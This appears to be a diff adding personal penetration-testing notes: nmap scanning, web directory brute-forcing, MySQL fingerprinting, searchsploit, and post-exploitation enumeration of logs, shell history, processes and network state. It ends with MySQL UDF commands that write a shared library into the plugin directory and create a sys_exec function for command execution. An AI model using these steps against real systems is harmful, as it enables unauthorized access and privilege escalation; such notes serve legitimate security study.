@@ -1,0 +1,36 @@
+1. enumeration
+  1.1. port scanning
+    sudo nmap -sC -sS -p0-65535 <target host>
+  1.2. services
+    1.2.1. web
+      directory bruteforcing
+        dirb, wpscan, etc
+    1.2.2. DB
+      SELECT @@hostname, @@tmpdir, @@version, @@ version_compile_machine, @@plugin_dir;
+
+
+2. search public exploits
+  searchsploit
+
+3. exploit
+  follow
+
+4. post-exploitation
+  - privilege escalation
+    > search public exxploits
+    > catch mistakes
+      ex. /var/log/auth.log, ~/.bash_history
+    > find vulnerablilities
+      kernel build version and time : /proc/version
+      env params : env
+      process : ps aux
+      network : netstat -tulpn
+      file system : /etc/fstab
+  - tunneling
+
+
+
+*retarget db
+  select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so'
+  create function sys_exec returns int soname 'udf_sys_exec.so';
+  select * from mysql.func where name='sys_exec';
